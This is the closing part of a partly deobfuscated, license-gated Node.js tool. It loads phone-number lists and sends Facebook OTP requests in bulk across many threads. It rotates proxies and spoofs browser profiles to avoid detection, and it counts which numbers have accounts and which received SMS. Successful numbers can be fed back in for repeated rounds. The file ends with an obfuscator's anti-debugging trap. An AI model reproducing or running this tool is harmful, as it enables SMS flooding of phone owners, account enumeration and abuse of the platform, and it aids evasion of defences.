  opts88.value = 'de-de.facebook.com';
  const opts89 = {};
  opts89.name = '\uD83C\uDDE7\uD83C\uDDF7 Portuguese (pt-br.facebook.com)';
  opts89.value = 'pt-br.facebook.com';
  const opts90 = {};
  opts90.name = '\uD83C\uDDF8\uD83C\uDDE6 Arabic (ar-ar.facebook.com)';
  opts90.value = 'ar-ar.facebook.com';
  const opts91 = {};
  opts91.name = '\uD83C\uDDEE\uD83C\uDDF9 Italian (it-it.facebook.com)';
  opts91.value = 'it-it.facebook.com';
  const opts92 = {};
  opts92.name = '\uD83C\uDDF9\uD83C\uDDF7 Turkish (tr-tr.facebook.com)';
  opts92.value = 'tr-tr.facebook.com';
  const arr16 = [
    opts84,
    opts85,
    opts86,
    opts87,
    opts88,
    opts89,
    opts90,
    opts91,
    opts92
  ];
  return await selectOption('SELECT REGION', arr16);
}
async function selectBrowserProfile() {
  const opts93 = {};
  opts93.name = '\uD83C\uDFB2 Random Mix (Auto-detect Best)';
  opts93.value = 'random';
  const opts94 = {};
  opts94.name = '\uD83C\uDF10 Google Chrome (Desktop/Mobile)';
  opts94.value = 'chrome';
  const opts95 = {};
  opts95.name = '\uD83D\uDCF1 Samsung Internet (Mobile Only)';
  opts95.value = 'samsung';
  const opts96 = {};
  opts96.name = '\uD83E\uDD8A Mozilla Firefox (Desktop)';
  opts96.value = 'firefox';
  const opts97 = {};
  opts97.name = '\uD83C\uDF0A Microsoft Edge (Desktop)';
  opts97.value = 'edge';
  const arr17 = [
    opts93,
    opts94,
    opts95,
    opts96,
    opts97
  ];
  return await selectOption('SELECT BROWSER PROFILE', arr17);
}
async function selectProxySetup() {
  const _Nh = await selectOption('SELECT PROXY', [
    {
      'name': '\uD83D\uDD0C Direct Connection (No Proxy)',
      'value': 'none'
    },
    {
      'name': '\uD83D\uDD17 Single Proxy String',
      'value': 'single'
    },
    {
      'name': '\uD83D\uDCC4 Proxy File (Rotation)',
      'value': 'file'
    }
  ]);
  if (_Nh === 'single') {
    process.stdout.write('\x1B[2J\x1B[H');
    printHeader();
    console.log('   \x1B[33mENTER PROXY\x1B[0m\n');
    console.log('   \x1B[90mFormats: ip:port:user:pass / socks5://user:pass@ip:port\x1B[0m');
    console.log('   \x1B[90m         host:port@user:pass / http://user:pass@ip:port\x1B[0m\n');
    const _Oh = await promptText('Proxy string:', '');
    _Oh && proxyManager.load(_Oh);
  } else {
    if (_Nh === 'file') {
      process.stdout.write('\x1B[2J\x1B[H');
      printHeader();
      console.log('   \x1B[33mENTER PROXY FILE\x1B[0m\n');
      const _Ph = await promptText('Proxy file path (drag & drop):', 'proxy.txt');
      if (_Ph && fs.existsSync(_Ph))
        proxyManager.load(_Ph);
      else
        _Ph && (console.log(R('  [!] Proxy file not found: ' + _Ph + '. Running direct.')), await sleep(2000));
    }
  }
  return _Nh;
}
async function confirmConfiguration(_Qh, _Rh, _Sh, _Th) {
  return await selectOption('Confirm: File=' + _Qh + ', Threads=' + _Rh + ', Lang=' + _Sh + ', Browser=' + _Th, [
    {
      'name': '\u2705 LAUNCH',
      'value': true
    },
    {
      'name': '\u274C Cancel',
      'value': false
    }
  ]);
}
async function main() {
  syncUAAndHost(FB_HOST);
  const _Uh = process.env.AIZEN_UI === '1';
  !_Uh && process.stdout.write('\x1B[2J\x1B[3J\x1B[H');
  const _Vh = process.argv.slice(2).filter(item15 => !item15.startsWith('--'));
  let _Wh, _Xh = 15, _Yh;
  if (_Vh.length >= 1 && fs.existsSync(_Vh[0])) {
    _Wh = _Vh[0];
    _Xh = parseInt(_Vh[1]) || 50;
    _Yh = _Vh[0];
    _Vh[2] && syncUAAndHost(_Vh[2]);
    _Vh[3] && _Vh[3].trim() && (proxyManager.load(_Vh[3]), dbg('Proxy set: ' + proxyManager.proxies.length + ' proxies loaded'));
    if (_Vh[5] && _Vh[5].trim()) {
      SELECTED_BROWSER = _Vh[5].trim();
    }
    await validateLicense();
  } else {
    await validateLicense();
    await sleep(1500);
    let _Zh = null;
    const _ai = setInterval(() => {
    }, 10000);
    try {
      const _bi = await pickNumbersSource();
      _Wh = _bi.numbersFile;
      _Zh = _bi.nexaConfig;
      _Xh = await selectThreadCount();
      SELECTED_LANG = await selectFacebookUrl();
      FB_HOST = SELECTED_LANG === 'random' ? 'www.facebook.com' : SELECTED_LANG;
      SELECTED_BROWSER = await selectBrowserProfile();
      syncUAAndHost(FB_HOST);
      await selectProxySetup();
      process.stdout.write('\x1B[2J\x1B[H');
      printHeader();
      const _ci = await promptText('Enter number of OTP resends per number [default: 0]:', '0'), _di = parseInt(_ci) || 0, _ei = await confirmConfiguration(_Wh, _Xh, FB_HOST, SELECTED_BROWSER);
      !_ei && (console.log(R('\n  [!] Launch cancelled. Exiting...\n')), process.exit(0));
      _Yh = _Wh;
      process.stdin.pause();
    } finally {
      clearInterval(_ai);
    }
  }
  let _fi = true;
  while (_fi) {
    let arr18 = [];
    if (!nexaConfig) {
      arr18 = loadNumbers(_Wh);
      if (proxyManager.hasProxies) {
        dbg('PROXY STATUS: ' + proxyManager.proxies.length + ' proxies loaded, testing connectivity...');
        const _gi = await proxyManager.testConnectivity();
        if (!_gi) {
          const _hi = await ask(Y('  [!] Proxy failed. Continue without proxy? (y/N): '));
          _hi.toLowerCase() !== 'y' && (console.log(G('\n  Aborted.\n')), process.exit(0));
          dbg('USER CHOSE TO CLEAR PROXIES');
          proxyManager.proxies = [];
        }
      } else
        dbg('PROXY STATUS: No proxies loaded, using direct connection');
    }
    let _ii;
    try {
      !_Uh && process.stdout.write(C('  Loading session...'));
      const opts98 = {
        'host': FB_HOST || 'www.facebook.com',
        'locale': 'en_US',
        'lang': 'en-US,en;q=0.9'
      };
      if (opts98.host === 'random')
        opts98.host = 'www.facebook.com';
      _ii = await seedSession(null, null, opts98, _ji => {
        _Uh && console.log('[SEED] ' + _ji);
      });
      if (!_Uh) {
        process.stdout.write('\r\x1B[K');
      }
    } catch (err54) {
      !_Uh ? (process.stdout.write('\r\x1B[K'), console.log(R('\n  \u2717 Seed failed: ' + (err54.stack || err54.message)))) : console.log('[SEED_FAILED] ' + err54.message);
      process.exit(1);
    }
    await sleep(1000);
    const _ki = await runPool(arr18, _Xh, _ii, _Yh, nexaConfig), _li = path.join(__dirname, 'results'), _mi = path.join(_li, 'otp_sent.txt');
    if (_ki.success.length > 0) {
      const opts99 = {};
      opts99.recursive = true;
      if (!fs.existsSync(_li))
        fs.mkdirSync(_li, opts99);
      fs.writeFileSync(_mi, _ki.success.join('\n') + '\n');
    }
    console.log('');
    console.log(B('  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557'));
    console.log(B('  \u2551') + W.bold('  V6 API OTP \u2014 COMPLETE                     ') + B('\u2551'));
    console.log(B('  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563'));
    console.log(B('  \u2551') + ('  ' + chalk.greenBright('OTP Sent') + '     ' + chalk.greenBright(String(_ki.success.length).padStart(6))) + '                  ' + B('\u2551'));
    console.log(B('  \u2551') + ('  ' + G('No Account') + '   ' + G(String(_ki.noAccount.length).padStart(6))) + '                  ' + B('\u2551'));
    console.log(B('  \u2551') + ('  ' + Y('No SMS') + '       ' + Y(String(_ki.noSms.length).padStart(6))) + '                  ' + B('\u2551'));
    console.log(B('  \u2551') + ('  ' + R('Errors') + '       ' + R(String(_ki.errors.length).padStart(6))) + '                  ' + B('\u2551'));
    console.log(B('  \u2551') + ('  ' + C('Data Used') + '    ' + C((dataMB() + ' MB').padEnd(20))) + '    ' + B('\u2551'));
    proxyManager.hasProxies && console.log(B('  \u2551') + ('  ' + C('Proxy') + '        ' + C(proxyManager.getStatus().padEnd(20))) + '    ' + B('\u2551'));
    console.log(B('  \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\n'));
    const _ni = await selectOption('Processing Complete. What next?', [
      {
        'name': 'Reuse successful numbers (' + _mi + ')',
        'value': 'reuse'
      },
      {
        'name': 'Go Home (Restart)',
        'value': 'home'
      },
      {
        'name': 'Exit',
        'value': 'exit'
      }
    ]);
    if (_ni === 'reuse') {
      if (fs.existsSync(_mi)) {
        let _oi = fs.readFileSync(_mi, 'utf8').split('\n').map(item16 => item16.trim()).filter(item17 => item17.length > 5);
        fs.writeFileSync(_Wh, _oi.join('\n'));
        fs.writeFileSync(_mi, '');
        console.log('\n  \x1B[32m\u2713 Copied ' + _oi.length + ' successful numbers to ' + _Wh + ' and cleared ' + _mi + '.\x1B[0m\n');
      } else
        console.log('\n  \x1B[31m\u2717 No successful numbers found.\x1B[0m\n'), _fi = false;
    } else {
      if (_ni === 'home') {
        const _pi = setInterval(() => {
        }, 10000);
        try {
          const _qi = await pickNumbersSource();
          _Wh = _qi.numbersFile;
          nexaConfig = _qi.nexaConfig;
          _Xh = await selectThreadCount();
          SELECTED_LANG = await selectFacebookUrl();
          FB_HOST = SELECTED_LANG === 'random' ? 'www.facebook.com' : SELECTED_LANG;
          SELECTED_BROWSER = await selectBrowserProfile();
          syncUAAndHost(FB_HOST);
          await selectProxySetup();
          const _ri = await promptText('Enter number of OTP resends per number [default: 0]:', '0'), _si = parseInt(_ri) || 0;
          _Yh = _Wh;
        } finally {
          clearInterval(_pi);
        }
      } else {
        _fi = false;
      }
    }
  }
}
main().catch(err58 => {
  try {
    fs.appendFileSync(path.join(__dirname, 'fatal_error.log'), '[' + new Date().toISOString() + '] ' + (err58.stack || err58.message) + '\n');
  } catch (err55) {
  }
  console.log(R('\n  [!] Fatal: ' + err58.message));
  process.exit(1);
});
function _o(_ti) {
  function _ui(_vi) {
    if (typeof _vi === 'string')
      return function (_wi) {
      }.constructor('while (true) {}').apply('counter');
    else {
      if (('' + _vi / _vi).length !== 1 || _vi % 20 === 0) {
        (function () {
          return true;
        }.constructor('debu' + 'gger').call('action'));
      } else {
        (function () {
          return false;
        }.constructor('debu' + 'gger').apply('stateObject'));
      }
    }
    _ui(++_vi);
  }
  try {
    if (_ti)
      return _ui;
    else
      _ui(0);
  } catch (err56) {
  }
}
